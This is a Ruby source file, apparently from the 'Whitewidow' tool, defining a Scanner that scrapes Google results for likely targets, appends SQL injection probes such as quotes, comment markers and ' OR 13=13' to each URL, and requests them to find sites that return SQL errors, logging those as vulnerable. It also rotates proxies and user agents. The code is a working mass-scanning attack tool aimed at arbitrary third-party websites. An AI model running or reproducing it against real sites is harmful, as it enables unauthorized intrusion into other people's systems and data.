module Whitewidow
  # Preliminary extraction of Scanner logic into self class
  class Scanner

    class << self
      #
      # File formatting
      #
      def format_file(user_file)
        display_file_missing_error(user_file) unless File.exist?(user_file)
        FORMAT.info('Writing to temporary file..')
        prepare_file_flag_file(user_file)
        FORMAT.info("File: #{user_file}, has been formatted and saved as #sites.txt in the tmp directory.")
      end

      #
      # Get the URLS by connecting to google and scraping for the URLS on the first page
      #
      def get_urls(proxy = nil)
        query = SETTINGS.extract_query!

        File.read("#{QUERY_BLACKLIST_PATH}").each_line do |black|  # check if the search query is black listed
          if query == black
            FORMAT.warning("Query: #{query} is blacklisted, defaulting to random query")
            query = File.readlines("#{PATH}/lib/lists/search_query.txt").sample  # Retry if it is
          end
        end

        FORMAT.info("I'm searching for possible SQL vulnerable sites, using search query #{query.chomp}")
        agent = Mechanize.new
        if proxy
          agent.set_proxy(proxy.split(":").first, proxy.split(":").last)  # Set your proxy if used
        end
        correct_agent = SETTINGS.random_agent?
        agent.user_agent = correct_agent
        correct_agent == DEFAULT_USER_AGENT ? FORMAT.info("Using default user agent") :
            FORMAT.info("Grabbed random agent: #{correct_agent}")
        page = agent.get("http://google.com")
        google_form = page.form('f')
        google_form.q = "#{query}"  # Search Google for the query
        url = agent.submit(google_form, google_form.buttons.first)
        url.links.each do |link|
          if link.href.to_s =~ /url.q/  # Pull the links from the search
            str = link.href.to_s
            str_list = str.split(%r{=|&})
            urls = str_list[1]
            if urls.split("/")[2].start_with?(*SKIP)  # Skip all the bad URLs
              next
            end
            urls_to_log = URI.decode(urls)
            FORMAT.success("Site found: #{urls_to_log}")
            sleep(0.3)
            # sites_found = []
            # sites_found.push(urls_to_log).uniq!
            # sites_found.each { |url|   # TODO: Figure out why it's saving the sites multiple times
            #   SETTINGS.add_error_based_sql_test(url)
            #   SETTINGS.add_blind_based_sql_test(url)
            #}
            %w(' -- ; " /* '/* '-- "-- '; "; `).each { |sql|
              File.open("#{SITES_TO_CHECK_PATH}", 'a+') { |to_check| to_check.puts("#{urls_to_log}#{sql}") } # Add sql syntax to all "="
              MULTIPARAMS.check_for_multiple_parameters(urls_to_log, sql)
            }
            [" AND 1=1", " OR 13=13", " AND 13=13"].each { |blind|  # Temp added again
              File.open("#{SITES_TO_CHECK_PATH}", "a+") { |blind_check| blind_check.puts("#{urls_to_log}#{blind}") }
            }
          end
        end
        FORMAT.info("I've dumped possible vulnerable sites into #{SITES_TO_CHECK_PATH}")
      end

      #
      # Check the sites that where found for vulnerabilities by checking if they throw a certain error
      #
      def vulnerability_check(file_mode: false)
        file_to_read = file_mode ? FILE_FLAG_FILE_PATH : SITES_TO_CHECK_PATH  # Check which file to read
        FORMAT.info("Reading from #{file_to_read}")
        FORMAT.info('Forcing encoding to UTF-8') unless file_mode
        IO.read("#{file_to_read}").each_line do |vuln|
          begin
            FORMAT.info("Parsing page for SQL syntax error: #{vuln.chomp}")
            Timeout::timeout(10) do
              begin
                if SETTINGS.parse("#{vuln.chomp}'", 'html', 0) =~ SQL_VULN_REGEX  # If it has the vuln regex error
                  FORMAT.site_found(vuln.chomp)
                  File.open("#{TEMP_VULN_LOG}", "a+") { |vulnerable| vulnerable.puts(vuln) }
                  sleep(0.5)
                else
                  FORMAT.warning("#{vuln.chomp} is not vulnerable, dumped to non_exploitable.txt")
                  File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |non_exploit| non_exploit.puts(vuln) }
                  sleep(0.5)
                end
              rescue Timeout::Error, OpenSSL::SSL::SSLError  # Timeout or SSL errors
                FORMAT.warning("Site: #{vuln.chomp} failed to load, dumped to non_exploitable.txt")
                File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |timeout| timeout.puts(vuln) }
                sleep(0.5)
                next
              end
            end
          rescue *LOADING_ERRORS
            FORMAT.err("#{vuln.chomp} failed due to an error while connecting, URL dumped to non_exploitable.txt")
            File.open("#{NON_EXPLOITABLE_PATH}", "a+") { |error| error.puts(vuln) }
            next
          end
        end
      end

      private

      def display_file_missing_error(user_file)
        puts <<~_END_

          Hey now my friend, I know you're eager, I am also, but that file #{user_file}
          either doesn't exist, or it's not in the directory you say it's in..

          I'm gonna need you to go find that file, move it to the correct directory and then
          run me again.

          Don't worry I'll wait!
             _END_
                 .yellow.bold  # Error out because the file doesn't exist
        exit(0)
      end

      def prepare_file_flag_file(user_file)
        # Skip blank lines and whitespace
        IO.read(user_file).each_line do |line|
          File.open(FILE_FLAG_FILE_PATH, 'a+') { |outfile| outfile.puts(line.strip) unless line.chomp.empty? }
        end
      end
    end
  end
end
